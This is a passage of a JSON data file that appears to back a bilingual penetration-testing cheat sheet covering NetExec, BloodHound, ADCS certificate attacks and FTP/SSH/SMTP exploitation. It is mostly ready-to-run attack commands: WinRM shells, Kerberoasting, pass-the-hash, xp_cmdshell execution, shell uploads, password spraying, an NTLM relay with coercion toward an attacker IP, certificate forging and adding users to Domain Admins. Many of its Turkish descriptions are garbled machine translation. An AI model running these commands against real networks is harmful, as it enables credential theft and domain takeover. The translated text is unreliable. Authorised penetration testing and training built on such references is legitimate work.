            "cmd": "nxc winrm <TARGET_IP> -u <USER> -p '<PASS>' --shell",
            "tags": [
              "essential"
            ],
            "desc_tr": "Al: interactive shell WinRM üzerinden"
          },
          {
            "title": "NXC LDAP Enumerate",
            "desc": "LDAP enumeration with credentials",
            "cmd": "nxc ldap <DC_IP> -u <USER> -p '<PASS>' --query '(objectClass=user)' ''",
            "tags": [
              "tool"
            ],
            "desc_tr": "LDAP listeleme kimlik bilgileri ile"
          },
          {
            "title": "NXC LDAP Kerberoast",
            "desc": "Find Kerberoastable users via LDAP",
            "cmd": "nxc ldap <DC_IP> -u <USER> -p '<PASS>' --kerberoasting output.txt",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bul: Kerberoastable users LDAP üzerinden"
          },
          {
            "title": "NXC LDAP ASREPRoast",
            "desc": "Find AS-REP roastable users",
            "cmd": "nxc ldap <DC_IP> -u <USER> -p '<PASS>' --asreproast output.txt",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bul: AS-REP roastable users"
          },
          {
            "title": "NXC LDAP Trusted For Delegation",
            "desc": "Find unconstrained delegation accounts",
            "cmd": "nxc ldap <DC_IP> -u <USER> -p '<PASS>' --trusted-for-delegation",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bul: sınırsız delegasyaccounts üzerinde"
          },
          {
            "title": "NXC LDAP Password Not Required",
            "desc": "Find accounts with no password required",
            "cmd": "nxc ldap <DC_IP> -u <USER> -p '<PASS>' --password-not-required",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bul: accounts no password required ile"
          },
          {
            "title": "NXC MSSQL Auth",
            "desc": "Authenticate to MSSQL",
            "cmd": "nxc mssql <TARGET_IP> -u <USER> -p '<PASS>'",
            "tags": [
              "essential"
            ],
            "desc_tr": "kimlik doğrulama MSSQL'e"
          },
          {
            "title": "NXC MSSQL Execute Query",
            "desc": "Run SQL query",
            "cmd": "nxc mssql <TARGET_IP> -u <USER> -p '<PASS>' -q 'SELECT name FROM master.dbo.sysdatabases'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Çalıştır: SQL query"
          },
          {
            "title": "NXC MSSQL OS Command",
            "desc": "Execute OS command via xp_cmdshell",
            "cmd": "nxc mssql <TARGET_IP> -u <USER> -p '<PASS>' -x 'whoami'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Çalıştır: OS command xp_cmdshell üzerinden"
          },
          {
            "title": "NXC MSSQL Windows Auth",
            "desc": "Authenticate to MSSQL with Windows/Domain credentials",
            "cmd": "nxc mssql <TARGET_IP> -u <USER> -p '<PASS>' -d <DOMAIN>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Windows/Domain kimlik bilgileri ile MSSQL'e bağlan"
          },
          {
            "title": "NXC MSSQL Local Auth",
            "desc": "Authenticate with SQL local account",
            "cmd": "nxc mssql <TARGET_IP> -u <USER> -p '<PASS>' --local-auth",
            "tags": [
              "essential"
            ],
            "desc_tr": "SQL yerel hesabı ile kimlik doğrulama"
          },
          {
            "title": "NXC MSSQL Pass the Hash",
            "desc": "Authenticate to MSSQL using NTLM hash",
            "cmd": "nxc mssql <TARGET_IP> -u <USER> -H <NTLM_HASH>",
            "tags": [
              "essential"
            ],
            "desc_tr": "NTLM hash ile MSSQL'e bağlan"
          },
          {
            "title": "NXC MSSQL Enum Privileges",
            "desc": "Check if current user is sysadmin",
            "cmd": "nxc mssql <TARGET_IP> -u <USER> -p '<PASS>' -q 'SELECT IS_SRVROLEMEMBER(\"sysadmin\")'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Mevcut kullanıcının sysadmin olup olmadığını kontrol et"
          },
          {
            "title": "NXC MSSQL Put File",
            "desc": "Upload file to target via MSSQL",
            "cmd": "nxc mssql <TARGET_IP> -u <USER> -p '<PASS>' --put-file /local/shell.exe 'C:\\Temp\\shell.exe'",
            "tags": [
              "advanced"
            ],
            "desc_tr": "MSSQL üzerinden hedefe dosya yükle"
          },
          {
            "title": "NXC MSSQL Get File",
            "desc": "Download file from target via MSSQL",
            "cmd": "nxc mssql <TARGET_IP> -u <USER> -p '<PASS>' --get-file 'C:\\Temp\\data.txt' /local/data.txt",
            "tags": [
              "advanced"
            ],
            "desc_tr": "MSSQL üzerinden hedeften dosya indir"
          },
          {
            "title": "NXC MSSQL Password Spray",
            "desc": "Spray passwords against MSSQL service",
            "cmd": "nxc mssql <SUBNET>/24 -u users.txt -p '<PASS>' --continue-on-success",
            "tags": [
              "tool"
            ],
            "desc_tr": "MSSQL servisine password spray saldırısı"
          },
          {
            "title": "Proxychains NXC MSSQL Auth",
            "desc": "Authenticate to MSSQL through SOCKS proxy",
            "cmd": "proxychains -q nxc mssql <TARGET_IP> -u <USER> -p '<PASS>'",
            "tags": [
              "essential"
            ],
            "desc_tr": "SOCKS proxy üzerinden MSSQL'e kimlik doğrulama"
          },
          {
            "title": "Proxychains NXC MSSQL Command Exec",
            "desc": "Execute OS command on MSSQL through SOCKS proxy",
            "cmd": "proxychains -q nxc mssql <TARGET_IP> -u <USER> -p '<PASS>' -x 'whoami'",
            "tags": [
              "essential"
            ],
            "desc_tr": "SOCKS proxy üzerinden MSSQL'de OS komutu çalıştır"
          },
          {
            "title": "Proxychains NXC MSSQL Query",
            "desc": "Run SQL query on MSSQL through SOCKS proxy",
            "cmd": "proxychains -q nxc mssql <TARGET_IP> -u <USER> -p '<PASS>' -q 'SELECT name FROM master.dbo.sysdatabases'",
            "tags": [
              "essential"
            ],
            "desc_tr": "SOCKS proxy üzerinden MSSQL'de SQL sorgusu çalıştır"
          },
          {
            "title": "Proxychains NXC MSSQL with Domain",
            "desc": "Authenticate to MSSQL with domain credentials through proxy",
            "cmd": "proxychains -q nxc mssql <TARGET_IP> -u <USER> -p '<PASS>' -d <DOMAIN>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Proxy üzerinden domain kimlik bilgileri ile MSSQL'e bağlan"
          }
        ],
        "name_tr": "WinRM / LDAP / MSSQL"
      }
    ],
    "name_tr": "NetExec / CrackMapExec",
    "description_tr": "NetExec (nxc) and CrackMapExec for Active Directory enumeration, lateral movement, and credential attacks."
  },
  {
    "id": "bloodhound",
    "name": "BloodHound & SharpHound",
    "icon": "🐕",
    "description": "BloodHound AD attack path analysis, SharpHound collection, and useful Cypher queries for privilege escalation paths.",
    "subcategories": [
      {
        "name": "SharpHound Collection",
        "commands": [
          {
            "title": "SharpHound All Collection",
            "desc": "Collect all data types",
            "cmd": "SharpHound.exe -c All --outputdirectory C:\\Temp",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Topla: tüm data types"
          },
          {
            "title": "SharpHound Default Collection",
            "desc": "Default collection (fastest)",
            "cmd": "SharpHound.exe -c Default",
            "tags": [
              "essential"
            ],
            "desc_tr": "Default collecti(fastest) üzerinde"
          },
          {
            "title": "SharpHound DCOnly",
            "desc": "Only collect from DC (stealthy)",
            "cmd": "SharpHound.exe -c DCOnly",
            "tags": [
              "tool"
            ],
            "desc_tr": "Only collect DC (stealthy) üzerinden"
          },
          {
            "title": "SharpHound with Domain",
            "desc": "Specify domain to collect from",
            "cmd": "SharpHound.exe -c All -d <DOMAIN>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Specify domacollect from'e içinde"
          },
          {
            "title": "SharpHound Custom DC",
            "desc": "Specify domain controller",
            "cmd": "SharpHound.exe -c All --DomainController <DC_IP> -d <DOMAIN>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Specify etki alanı denetleyicisi (DC)"
          },
          {
            "title": "SharpHound Stealth Mode",
            "desc": "Stealth collection using LDAP only",
            "cmd": "SharpHound.exe -c Stealth",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Stealth collectiLDAP only kullanarak üzerinde"
          },
          {
            "title": "BloodHound.py Collection",
            "desc": "Remote collection from Linux",
            "cmd": "bloodhound-python -u <USER> -p '<PASS>' -d <DOMAIN> -dc <DC_IP> -c All --zip",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Uzaktan collectiLinux üzerinden üzerinde"
          },
          {
            "title": "BloodHound.py via NTLM Hash",
            "desc": "Collection using pass-the-hash",
            "cmd": "bloodhound-python -u <USER> --hashes :<NTLM_HASH> -d <DOMAIN> -dc <DC_IP> -c All --zip",
            "tags": [
              "tool"
            ],
            "desc_tr": "Collectipass-the-hash kullanarak üzerinde"
          },
          {
            "title": "RustHound Collection",
            "desc": "Rust-based BloodHound collector",
            "cmd": "rusthound -d <DOMAIN> -u '<USER>@<DOMAIN>' -p '<PASS>' -i <DC_IP> -o /tmp/bh --zip",
            "tags": [
              "tool"
            ],
            "desc_tr": "Rust-based BloodHound collector"
          }
        ],
        "name_tr": "SharpHound Collection"
      },
      {
        "name": "BloodHound Setup",
        "commands": [
          {
            "title": "Start Neo4j",
            "desc": "Start Neo4j database for BloodHound",
            "cmd": "sudo neo4j start",
            "tags": [
              "essential"
            ],
            "desc_tr": "Başlat: Neo4j database for BloodHound"
          },
          {
            "title": "Neo4j Console",
            "desc": "Open Neo4j web console",
            "cmd": "sudo neo4j console",
            "tags": [
              "tool"
            ],
            "desc_tr": "Aç: Neo4j web console"
          },
          {
            "title": "BloodHound Start (Linux)",
            "desc": "Launch BloodHound GUI",
            "cmd": "bloodhound &",
            "tags": [
              "essential"
            ],
            "desc_tr": "Launch BloodHound GUI"
          },
          {
            "title": "BloodHound CE Docker",
            "desc": "Run BloodHound Community Edition in Docker",
            "cmds": [
              "docker run -d -p 8080:8080 -p 7687:7687 -p 7474:7474 --name bloodhound specterops/bloodhound-ce"
            ],
            "tags": [
              "tool"
            ],
            "desc_tr": "Çalıştır: BloodHound Community EditiDocker üzerinde içinde"
          },
          {
            "title": "Neo4j Clear Database",
            "desc": "Clear all BloodHound data from Neo4j",
            "cmd": "MATCH (n) DETACH DELETE n",
            "tags": [
              "tool"
            ],
            "note": "Run in Neo4j browser at :7474",
            "desc_tr": "Temizle: tüm BloodHound data Neo4j üzerinden"
          }
        ],
        "name_tr": "BloodHound Setup"
      },
      {
        "name": "Cypher Queries",
        "commands": [
          {
            "title": "Find All DA Paths from Owned",
            "desc": "Attack paths from owned users to Domain Admins",
            "cmd": "MATCH p=shortestPath((n {owned:true})-[*1..]->(g:Group {name:'DOMAIN ADMINS@<DOMAIN>'})) RETURN p",
            "tags": [
              "essential"
            ],
            "note": "Run in BloodHound raw query or Neo4j browser",
            "desc_tr": "saldırı yolları owned users DomaAdmin üzerinden'e içinde"
          },
          {
            "title": "Find Kerberoastable Users",
            "desc": "Users with SPNs (Kerberoastable)",
            "cmd": "MATCH (u:User {hasspn:true}) RETURN u.name, u.description ORDER BY u.name",
            "tags": [
              "essential"
            ],
            "desc_tr": "Users SPNs (Kerberoastable) ile"
          },
          {
            "title": "Find AS-REP Roastable",
            "desc": "Users with pre-auth disabled",
            "cmd": "MATCH (u:User {dontreqpreauth:true}) RETURN u.name",
            "tags": [
              "essential"
            ],
            "desc_tr": "Users pre-auth disabled ile"
          },
          {
            "title": "Find Unconstrained Delegation",
            "desc": "Computers with unconstrained delegation",
            "cmd": "MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name",
            "tags": [
              "essential"
            ],
            "desc_tr": "Computers sınırsız delegasyile üzerinde"
          },
          {
            "title": "Find Constrained Delegation",
            "desc": "Accounts with constrained delegation",
            "cmd": "MATCH (u) WHERE u.allowedtodelegate IS NOT NULL RETURN u.name, u.allowedtodelegate",
            "tags": [
              "essential"
            ],
            "desc_tr": "Accounts kısıtlı delegasyile üzerinde"
          },
          {
            "title": "Find Local Admin Paths",
            "desc": "Who has local admin on which computers",
            "cmd": "MATCH p=(u:User)-[:AdminTo]->(c:Computer) RETURN u.name, c.name",
            "tags": [
              "essential"
            ],
            "desc_tr": "Who has yerel yönetici which computers üzerinde"
          },
          {
            "title": "Find High Value Targets",
            "desc": "Computers and users marked high value",
            "cmd": "MATCH (n {highvalue:true}) RETURN n.name, labels(n)",
            "tags": [
              "essential"
            ],
            "desc_tr": "Computers and users marked high value"
          },
          {
            "title": "Find DCSync Rights",
            "desc": "Who can DCSync (DS-Replication-Get-Changes-All)",
            "cmd": "MATCH p=(n)-[:DCSync|AllExtendedRights|GenericAll]->(d:Domain) RETURN p",
            "tags": [
              "essential"
            ],
            "desc_tr": "Who can DCSync (DS-Replication-Get-Changes-tüm)"
          },
          {
            "title": "Find WriteDACL to Domain",
            "desc": "Accounts with WriteDACL on domain object",
            "cmd": "MATCH p=(n)-[:WriteDacl]->(d:Domain) RETURN p",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Accounts WriteDACL domaobject ile üzerinde içinde"
          },
          {
            "title": "Find GenericAll on DA Group",
            "desc": "Who has GenericAll on Domain Admins",
            "cmd": "MATCH p=(n)-[:GenericAll]->(g:Group {name:'DOMAIN ADMINS@<DOMAIN>'}) RETURN p",
            "tags": [
              "essential"
            ],
            "desc_tr": "Who has GenericAll DomaAdmin üzerinde içinde"
          },
          {
            "title": "Find Shadow Credentials Path",
            "desc": "Accounts that can add KeyCredentialLink",
            "cmd": "MATCH p=(n)-[:AddKeyCredentialLink]->(m) RETURN p",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Accounts that can add KeyCredentialLink"
          },
          {
            "title": "Shortest Path to DA",
            "desc": "Shortest path from any node to Domain Admin",
            "cmd": "MATCH p=shortestPath((n)-[*1..]->(g:Group {name:'DOMAIN ADMINS@<DOMAIN>'})) WHERE NOT n=g RETURN p LIMIT 10",
            "tags": [
              "essential"
            ],
            "desc_tr": "Shortest path any node DomaAdmin üzerinden'e içinde"
          },
          {
            "title": "Find All Groups for User",
            "desc": "All group memberships including nested",
            "cmd": "MATCH p=(u:User {name:'<USER>@<DOMAIN>'})-[:MemberOf*1..]->(g:Group) RETURN g.name",
            "tags": [
              "tool"
            ],
            "desc_tr": "tüm group memberships including nested"
          },
          {
            "title": "Find LAPS Readable",
            "desc": "Who can read LAPS passwords",
            "cmd": "MATCH p=(u)-[:ReadLAPSPassword]->(c:Computer) RETURN u.name, c.name",
            "tags": [
              "essential"
            ],
            "desc_tr": "Who can read LAPS passwords"
          },
          {
            "title": "Find GMSA Readable",
            "desc": "Who can read GMSA passwords",
            "cmd": "MATCH p=(u)-[:ReadGMSAPassword]->(a:User) RETURN p",
            "tags": [
              "tool"
            ],
            "desc_tr": "Who can read GMSA passwords"
          },
          {
            "title": "Find Owned Admins",
            "desc": "Owned accounts with admin rights",
            "cmd": "MATCH (u:User {owned:true})-[:AdminTo]->(c:Computer) RETURN u.name, c.name",
            "tags": [
              "essential"
            ],
            "desc_tr": "Owned accounts admrights ile içinde"
          },
          {
            "title": "Find Password in Description",
            "desc": "Users with potential passwords in description",
            "cmd": "MATCH (u:User) WHERE u.description CONTAINS 'pass' OR u.description CONTAINS 'pwd' RETURN u.name, u.description",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Users potential passwords descriptiile üzerinde içinde"
          }
        ],
        "name_tr": "Cypher Queries"
      }
    ],
    "name_tr": "BloodHound ve SharpHound",
    "description_tr": "BloodHound AD attack path analysis, SharpHound collection, and useful Cypher queries for privilege escalation paths."
  },
  {
    "id": "adcs-attacks",
    "name": "ADCS — Certificate Services Attacks",
    "icon": "📜",
    "description": "Active Directory Certificate Services exploitation — ESC1 through ESC8 using Certipy, Certutil, and related tools.",
    "subcategories": [
      {
        "name": "Certipy Enumeration",
        "commands": [
          {
            "title": "Certipy Find Vulnerabilities",
            "desc": "Enumerate ADCS and find vulnerable templates",
            "cmd": "certipy find -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> -vulnerable -stdout",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Listele: ADCS and find zafiyet(ler) templates"
          },
          {
            "title": "Certipy Find All Templates",
            "desc": "List all certificate templates",
            "cmd": "certipy find -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> -stdout",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: tüm certificate templates"
          },
          {
            "title": "Certipy Find via Hash",
            "desc": "Enumerate ADCS with NTLM hash",
            "cmd": "certipy find -u '<USER>@<DOMAIN>' -hashes :<NTLM_HASH> -dc-ip <DC_IP> -vulnerable -stdout",
            "tags": [
              "tool"
            ],
            "desc_tr": "Listele: ADCS NTLM hash ile"
          },
          {
            "title": "Certify Find (Windows)",
            "desc": "Find vulnerable certificate templates from Windows",
            "cmd": "Certify.exe find /vulnerable",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Bul: zafiyet(ler) certificate templates Windows üzerinden"
          },
          {
            "title": "Certify Find All (Windows)",
            "desc": "List all certificate templates from Windows",
            "cmd": "Certify.exe find",
            "tags": [
              "tool"
            ],
            "desc_tr": "Listele: tüm certificate templates Windows üzerinden"
          },
          {
            "title": "NXC LDAP ADCS Enum",
            "desc": "Find ADCS servers via NXC",
            "cmd": "nxc ldap <DC_IP> -u <USER> -p '<PASS>' -M adcs",
            "tags": [
              "tool"
            ],
            "desc_tr": "Bul: ADCS servers NXC üzerinden"
          }
        ],
        "name_tr": "Certipy Enumeration"
      },
      {
        "name": "ESC1 — SAN Impersonation",
        "commands": [
          {
            "title": "ESC1 Request as DA (Certipy)",
            "desc": "Request cert with DA UPN in SAN field",
            "cmd": "certipy req -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> -ca '<CA_NAME>' -template '<TEMPLATE>' -upn 'administrator@<DOMAIN>'",
            "tags": [
              "essential"
            ],
            "desc_tr": "İste: cert DA UPN SAN field ile içinde"
          },
          {
            "title": "ESC1 Auth with Certificate",
            "desc": "Authenticate using obtained certificate",
            "cmd": "certipy auth -pfx administrator.pfx -domain <DOMAIN> -dc-ip <DC_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "kimlik doğrulama obtained certificate kullanarak"
          },
          {
            "title": "ESC1 Request (Certify)",
            "desc": "Request cert as another user (Windows)",
            "cmd": "Certify.exe request /ca:<CA_SERVER>\\<CA_NAME> /template:<TEMPLATE> /altname:administrator",
            "tags": [
              "tool"
            ],
            "desc_tr": "İste: cert as another user (Windows)"
          },
          {
            "title": "Convert PEM to PFX",
            "desc": "Convert Certify output to PFX for use with Rubeus",
            "cmds": [
              "openssl pkcs12 -in cert.pem -keyex -CSP 'Microsoft Enhanced Cryptographic Provider v1.0' -export -out cert.pfx"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "Dönüştür: Certify output PFX ile kullanmak içRubeus'e içinde"
          }
        ],
        "name_tr": "ESC1 — SAN Impersonation"
      },
      {
        "name": "ESC2, ESC3, ESC4",
        "commands": [
          {
            "title": "ESC2 Any Purpose Template",
            "desc": "Any Purpose EKU allows auth — request cert with SAN",
            "cmd": "certipy req -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> -ca '<CA_NAME>' -template '<ESC2_TEMPLATE>' -upn 'administrator@<DOMAIN>'",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Any Purpose EKU allows auth — request cert SAN ile"
          },
          {
            "title": "ESC3 Enrollment Agent Request",
            "desc": "Step 1: Obtain enrollment agent certificate",
            "cmd": "certipy req -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> -ca '<CA_NAME>' -template '<ESC3_TEMPLATE>'",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Step 1: Obtaenrollment agent certificate içinde"
          },
          {
            "title": "ESC3 On-Behalf-Of Request",
            "desc": "Step 2: Request cert on behalf of DA",
            "cmd": "certipy req -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> -ca '<CA_NAME>' -template 'User' -on-behalf-of '<DOMAIN>\\administrator' -pfx agent.pfx",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Step 2: Request cert behalf of DA üzerinde"
          },
          {
            "title": "ESC4 Template Write Abuse",
            "desc": "Modify template to be vulnerable (ESC1 config)",
            "cmd": "certipy template -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> -template '<TEMPLATE>' -save-old",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Değiştir: template be zafiyet(ler) (ESC1 config)'e"
          }
        ],
        "name_tr": "ESC2, ESC3, ESC4"
      },
      {
        "name": "ESC6, ESC7, ESC8",
        "commands": [
          {
            "title": "ESC6 EDITF_ATTRIBUTESUBJECTALTNAME2",
            "desc": "CA allows SAN in any template — request with UPN",
            "cmd": "certipy req -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> -ca '<CA_NAME>' -template 'User' -upn 'administrator@<DOMAIN>'",
            "tags": [
              "advanced"
            ],
            "desc_tr": "CA allows SAN any template — request UPN ile içinde"
          },
          {
            "title": "ESC7 Manage CA Rights",
            "desc": "Add ManageCA right to enable EDITF flag",
            "cmds": [
              "certipy ca -ca '<CA_NAME>' -add-officer <USER> -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP>",
              "certipy ca -ca '<CA_NAME>' -enable-template 'SubCA' -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP>"
            ],
            "tags": [
              "advanced"
            ],
            "desc_tr": "Ekle: ManageCA right enable EDITF flag'e"
          },
          {
            "title": "ESC8 Web Enrollment NTLM Relay",
            "desc": "Relay DC$ auth to ADCS HTTP enrollment",
            "cmds": [
              "ntlmrelayx.py -t http://<CA_IP>/certsrv/certfnsh.asp -smb2support --adcs --template 'DomainController'",
              "coercer coerce -u <USER> -p '<PASS>' -d <DOMAIN> -l <ATTACKER_IP> -t <DC_IP>"
            ],
            "tags": [
              "advanced"
            ],
            "desc_tr": "Yönlendir: DC$ auth ADCS HTTP enrollment'e"
          },
          {
            "title": "Golden Certificate (Certipy)",
            "desc": "Forge certificate using stolen CA key",
            "cmd": "certipy forge -ca-pfx ca.pfx -upn 'administrator@<DOMAIN>' -subject 'CN=Administrator'",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Sahte oluştur: certificate stolen CA key kullanarak"
          }
        ],
        "name_tr": "ESC6, ESC7, ESC8"
      },
      {
        "name": "Certificate Authentication",
        "commands": [
          {
            "title": "Certipy Auth PKINIT",
            "desc": "Authenticate using certificate to get TGT + NTLM hash",
            "cmd": "certipy auth -pfx <USER>.pfx -domain <DOMAIN> -dc-ip <DC_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "kimlik doğrulama certificate get TGT + NTLM hash kullanarak'e"
          },
          {
            "title": "Rubeus PKINIT Auth",
            "desc": "Use certificate for Kerberos auth (Windows)",
            "cmd": "Rubeus.exe asktgt /user:<USER> /certificate:<CERT.pfx> /password:<PFX_PASS> /ptt",
            "tags": [
              "tool"
            ],
            "desc_tr": "Use certificate for Kerberos auth (Windows)"
          },
          {
            "title": "PassTheCert LDAP",
            "desc": "Use certificate to authenticate to LDAP",
            "cmd": "passthecert.py -action whoami -crt <USER>.crt -key <USER>.key -domain <DOMAIN> -dc-ip <DC_IP>",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Use certificate kimlik doğrulama to LDAP'e"
          },
          {
            "title": "PassTheCert Add DA",
            "desc": "Add user to Domain Admins via cert auth",
            "cmd": "passthecert.py -action modify_user -crt <USER>.crt -key <USER>.key -domain <DOMAIN> -dc-ip <DC_IP> -target <USER_TO_PROMOTE> -elevate",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Ekle: user DomaAdmin cert auth üzerinden'e içinde"
          }
        ],
        "name_tr": "Certificate Authentication"
      }
    ],
    "name_tr": "ADCS — Sertifika Servisleri Saldırıları",
    "description_tr": "Active Directory Certificate Services exploitation — ESC1 through ESC8 using Certipy, Certutil, and related tools."
  },
  {
    "id": "service-exploitation",
    "name": "Network Service Exploitation",
    "icon": "🔌",
    "description": "Service-specific exploitation techniques for common ports found during OSCP-style engagements.",
    "subcategories": [
      {
        "name": "FTP (21)",
        "commands": [
          {
            "title": "FTP Anonymous Login",
            "desc": "Test anonymous FTP access",
            "cmd": "ftp <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "note": "Username: anonymous, Password: anything or blank",
            "desc_tr": "Test et: anonymous FTP access"
          },
          {
            "title": "FTP Anonymous Login (One-liner)",
            "desc": "Connect to FTP with anonymous credentials directly",
            "cmd": "ftp anonymous@<TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bağlan: FTP anonymous kimlik bilgileri directly ile'e"
          },
          {
            "title": "FTP Get Single File",
            "desc": "Download a specific file from FTP session",
            "cmd": "get <FILENAME>",
            "tags": [
              "essential"
            ],
            "note": "Run inside FTP session after connecting",
            "desc_tr": "İndir: a belirli file FTP sessiüzerinden üzerinde"
          },
          {
            "title": "FTP Put File (Upload)",
            "desc": "Upload a file to FTP server",
            "cmd": "put <LOCAL_FILE>",
            "tags": [
              "essential"
            ],
            "note": "Run inside FTP session",
            "desc_tr": "Yükle: a file FTP server'e"
          },
          {
            "title": "FTP List Files Recursively",
            "desc": "List all files recursively after login",
            "cmd": "wget -r --no-passive ftp://anonymous:anonymous@<TARGET_IP>/",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: tüm files recursively login sonra"
          },
          {
            "title": "Hydra FTP Brute Force",
            "desc": "Brute force FTP credentials",
            "cmd": "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt ftp://<TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kaba kuvvet: kuvvet saldırısı FTP kimlik bilgileri"
          },
          {
            "title": "FTP Bounce Scan",
            "desc": "Use FTP bounce for port scanning",
            "cmd": "nmap -b anonymous@<FTP_IP> <TARGET_IP>",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Use FTP bounce for port taraması"
          },
          {
            "title": "FTP Binary Transfer",
            "desc": "Transfer binary file (avoid corruption)",
            "cmd": "ftp> binary",
            "tags": [
              "essential"
            ],
            "note": "Run inside FTP session before transferring executables",
            "desc_tr": "Transfer binary file (avoid corruption)"
          },
          {
            "title": "FTP Get All Files",
            "desc": "Download all files from FTP",
            "cmd": "wget -m ftp://anonymous:anonymous@<TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "İndir: tüm files FTP üzerinden"
          },
          {
            "title": "cURL FTP Enum",
            "desc": "List FTP directory with curl",
            "cmd": "curl -v ftp://<TARGET_IP>/ --user anonymous:anonymous",
            "tags": [
              "tool"
            ],
            "desc_tr": "Listele: FTP directory curl ile"
          }
        ],
        "name_tr": "FTP (21)"
      },
      {
        "name": "SSH (22)",
        "commands": [
          {
            "title": "SSH Connect Basic",
            "desc": "Connect to SSH server",
            "cmd": "ssh <USER>@<TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bağlan: SSH server'e"
          },
          {
            "title": "SSH with Private Key",
            "desc": "Connect using private key file",
            "cmd": "ssh -i id_rsa <USER>@<TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bağlan: özel anahtar file kullanarak"
          },
          {
            "title": "SSH Fix Key Permissions",
            "desc": "Fix private key permissions before use",
            "cmd": "chmod 600 id_rsa",
            "tags": [
              "essential"
            ],
            "desc_tr": "Fix özel anahtar permissions use önce"
          },
          {
            "title": "Hydra SSH Brute Force",
            "desc": "Brute force SSH credentials",
            "cmd": "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kaba kuvvet: kuvvet saldırısı SSH kimlik bilgileri"
          },
          {
            "title": "SSH User Enum (CVE-2018-15473)",
            "desc": "Enumerate valid SSH users",
            "cmd": "python3 ssh_user_enum.py --userList /usr/share/seclists/Usernames/top-usernames-shortlist.txt --ip <TARGET_IP>",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Listele: valid SSH users"
          },
          {
            "title": "SSH Tunnel Local Forward",
            "desc": "Forward local port to remote service",
            "cmd": "ssh -L <LOCAL_PORT>:<TARGET_HOST>:<TARGET_PORT> <USER>@<JUMP_IP> -N",
            "tags": [
              "essential"
            ],
            "desc_tr": "Yönlendir: yerel port uzak service'e"
          },
          {
            "title": "SSH Tunnel Remote Forward",
            "desc": "Expose local service on remote server",
            "cmd": "ssh -R <REMOTE_PORT>:localhost:<LOCAL_PORT> <USER>@<TARGET_IP> -N",
            "tags": [
              "essential"
            ],
            "desc_tr": "Expose yerel service uzak server üzerinde"
          },
          {
            "title": "SSH Dynamic SOCKS Proxy",
            "desc": "Create SOCKS5 proxy through SSH",
            "cmd": "ssh -D 1080 <USER>@<TARGET_IP> -N",
            "tags": [
              "essential"
            ],
            "desc_tr": "Oluştur: SOCKS5 vekil sunucu (proxy) SSH üzerinden"
          },
          {
            "title": "SSH ProxyJump",
            "desc": "Connect through jump host",
            "cmd": "ssh -J <USER>@<JUMP_IP> <USER>@<FINAL_TARGET>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Bağlan: jump host üzerinden"
          },
          {
            "title": "SSH Force Password Auth",
            "desc": "Disable key auth and force password prompt",
            "cmd": "ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no <USER>@<TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Devre dışı bırak: key auth and force password prompt"
          }
        ],
        "name_tr": "SSH (22)"
      },
      {
        "name": "SMTP (25/587)",
        "commands": [
          {
            "title": "SMTP Banner Grab",
            "desc": "Connect and grab SMTP banner",
            "cmd": "nc -nv <TARGET_IP> 25",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bağlan: and grab SMTP banner"
          },
          {
            "title": "SMTP VRFY User Enum",
            "desc": "Enumerate valid users via VRFY command",
            "cmd": "smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t <TARGET_IP>",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Listele: valid users VRFY command üzerinden"
          },
          {
